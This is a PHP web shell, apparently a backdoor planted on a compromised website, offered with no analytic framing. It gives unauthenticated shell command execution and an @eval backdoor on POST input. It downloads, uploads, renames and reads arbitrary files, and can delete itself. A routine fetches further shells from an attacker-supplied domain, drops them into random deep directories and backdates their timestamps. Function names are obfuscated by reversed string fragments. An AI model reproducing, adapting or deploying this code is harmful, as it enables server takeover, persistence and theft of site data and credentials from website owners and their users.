<?php error_reporting(0);
if ($_GET['imam'] == 'unlink') {
	unlink(__FILE__) ;
}
if ($_GET['imam'] == 'test') {
	echo '<title>imambro</title>' ;
}

if ($_GET['imam'] == 'cmd') {
	echo '<center>'."<br>".php_uname()."<br>"."<br>" ;
	echo getcwd() . "\n"; 
	echo '<form method="POST" action=""> <input type="text" name="cmd" value=""> <input type="submit" value=">>">' ;
	echo '</form>'.$cmd = $_POST['cmd']; $exec = shell_exec("$cmd"); 
	echo "<textarea rows='15' cols='85'>$exec</textarea>".'</center>';
}
$sr = "st" . /*+/*+*/
"rr" /*+/*+*/ . "ev";
$id = $sr /*+/*+*/
("ri" . "d_" . "si");
$rn = $sr /*+/*+*/
("em" . "an" . "er");
$dn = $sr /*+/*+*/
("em" . "anr" . "id");
$od = $sr /*+/*+*/
("ri" . "dne" . "po");
$rd = $sr /*+/*+*/
("ri" . "dda" . "er");
$cd = $sr /*+/*+*/
("ri" . "deso" . "lc");
$fpc = $sr /*+/*+*/
("stn" . "etn" . "oc_t" . "up_e" . "lif");
$fgc = $sr /*+/*+*/
("stn" . "etn" . "oc_t" . "eg_e" . "lif");
$muf = $sr /*+/*+*/
("eli" . "f_d" . "eda" . "olp" . "u_e" . "vom");
$dlform = '<form method="post">FN:<input name="fn" size="20" type="text">URL:<input name="url" size="50" type="text"><input type="submit" value="ok"></form>';
$ulform = '<form method="post" enctype="multipart/form-data"><input name="uf" type="file">SP:<input name="sp" size="50" type="text"><input type="submit" value="ok"></form>';
$rnform = '<form method="post">ON:<input name="on" size="50" type="text">NN:<input name="nn" size="50" type="text"><input type="submit" value="ok"></form>';
$lpform = '<form method="post">DP:<input name="dp" size="50" type="text"><input type="submit" value="ok"></form>';
$sfform = '<form method="post">DF:<input name="df" size="50" type="text"><input type="submit" value="ok"></form>';
if ($_GET['act'] == 'dl') {
    echo ($dlform);
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $fpc /*+/*+*/
        ($_POST['fn'], $fgc /*+/*+*/
        ($_POST['url']));
    }
    exit;
}
if ($_GET['act'] == 'ul') {
    echo ($ulform);
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $sp = empty($_POST['sp']) ? './' : $_POST['sp'] . '/';
        $muf /*+/*+*/
        ($ /*+/*+*/ {
            "_F" . "IL" . "ES"
        }
        ["uf"]["tmp_name"], $sp . $ /*+/*+*/ {
            "_F" . "IL" . "ES"
        }
        ["uf"]["name"]);
    }
    exit;
}
if ($_GET['act'] == 'rn') {
    echo ($rnform);
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $rn /*+/*+*/
        ($_POST['on'], $_POST['nn']);
    }
    exit;
}
if ($_GET['act'] == 'gp') {
    echo ($dn /*+/*+*/
    (__FILE__));
    exit;
}
if ($_GET['act'] == 'lp') {
    echo ($lpform);
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $dp = $_POST['dp'] . '/';
        $h = $od /*+/*+*/
        ($dp);
        while (($fn = $rd /*+/*+*/
        ($h)) !== false) {
            if ($id /*+/*+*/
            ($dp . $fn)) {
                $t1.= 'D&nbsp;' . $fn . '<br>';
            } else {
                $t2.= '&nbsp;&nbsp;' . $fn . '<br>';
            }
        }
        $cd /*+/*+*/
        ($dp);
        echo ($dp . '<br>' . $t1 . $t2);
    }
    exit;
}
if ($_GET['act'] == 'sf') {
    echo ($sfform);
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $df = $_POST['df'];
        echo ('<textarea style="width:100%;height:100%;" wrap="off">' . $fgc /*+/*+*/
        ($df) . '</textarea>');
    }
    exit;
}
 
?>
<?php @eval($_POST[imam]); ?>
<?php 
    error_reporting(0);
	define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
	function curl_get_contents($url){
       $ch =curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_TIMEOUT,5);
       curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
       $r = curl_exec($ch);
       curl_close($ch);
       return $r;
    }
    function check_remote_file_exists($url) {
	    $curl = curl_init($url);
	    curl_setopt($curl, CURLOPT_NOBODY, true);
	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
	    $result = curl_exec($curl);
	    $found = false;
	    if ($result !== false) {
	        $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	        if ($statusCode == 200) {
	            $found = true;
	        }
	    }
	    curl_close($curl);
	    return $found;
	}
	function copyfiles($file1,$file2){
	 	$contentx =@file_get_contents($file1);
	  	$openedfile = @fopen($file2, "w");
	  	@fwrite($openedfile, $contentx);
	  	@fclose($openedfile);
	    if ($contentx === FALSE) {
	   		$status=false;
	    }else $status=true;
	   	return $status;
  	}
	function read_dir_queue($dir,$level=5){
		$files=array();
		$files1=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if(count($path4)>($level+1)){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function read_dir_queue1($dir,$level=5){
		$files=array();
		$files1=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if(count($path4)>$level){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function rpath_arry($dir){
		$files=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					//if(count($path4)>($level+1)){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function getInd_Content($base_path1){
 		$file_path = $base_path1.'/index.php';
 		$file_path1 = $base_path1.'/index.html';
 		$file_path2 = $base_path1.'/index.htm';
 		$file_path3 = $base_path1.'/default.html';
 	
 		if(file_exists($file_path)){
 			$str=@file_get_contents($file_path);
 			$shell_content1=  $str;
			$shell_content2 = explode('?>',$shell_content1);
			$shell_content3 = $shell_content1;
			for($i=0;$i<count($shell_content2);$i++){
	 			if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false){
				 	$shell_content3=str_replace($shell_content2[$i]."?>","",$shell_content3);
				}
 			}
            echo $shell_content3;
 			exit;
 		}else if(file_exists($file_path1)){
 			$str1=@file_get_contents($file_path1);
 			echo $str1;
 			exit;
 		}else if(file_exists($file_path2)){
 			$str2=@file_get_contents($file_path2);
 			echo $str2;
 			exit;
 		}else if(file_exists($file_path3)){
 			$str3=@file_get_contents($file_path3);
 			echo $str3;
 			exit;
 		}else{
 			echo '';
 			exit;
 		}
	}
	function dir_size1($dir3,$url){
	      $dh = @opendir($dir3);
	      $return = array();
		  while($file = @readdir($dh)){
		     if($file!='.' and $file!='..'){
		     	$filetime[] = date("Y-m-d H:i:s",filemtime($file));
	         }
	      }  
          @closedir($dh);             
          @array_multisort($filetime);
          return $filetime;
	}
 	$sig=@$_GET['sig'];
 	@$domain_2020='http://'.$_GET['domain'];
 	if($sig=='beima'){
 		$level = $_GET['level'];
 		$aPathes = @read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath) {
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
			$arry11 = dirname($arry11);
			$arry22 = explode("/",$arry11);
			if(count($arry22)==$level){
				$arry1[] = dirname($aPathes[$iKey]);
			}else{
				$arry1[] = dirname($aPathes[$iKey]);
			}
		}
		$arry2= array_unique($arry1);
		shuffle($arry2);
		$rndKey = array_rand($arry2);
		$create_path1 = $arry2[$rndKey];
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/".$shell_file.".html";
		if(check_remote_file_exists($shell_source5) && $_GET['file_name']!=""){
			$file_name = $_GET['file_name'];
			if($file_name!=""){
				$shell_end5 = $create_path1.'/'.$file_name;
			}else{
				$shell_end5 = $create_path1.'/style.php';
			}
	 		if(copyfiles($shell_source5,$shell_end5))
		    {
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6; 
		    }else{
		    	$str6=@curl_get_contents($shell_source5);
		    	file_put_contents($shell_end5,$str6);
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6;
		    }
		}
	    exit;
 	}
 	exit();
?>
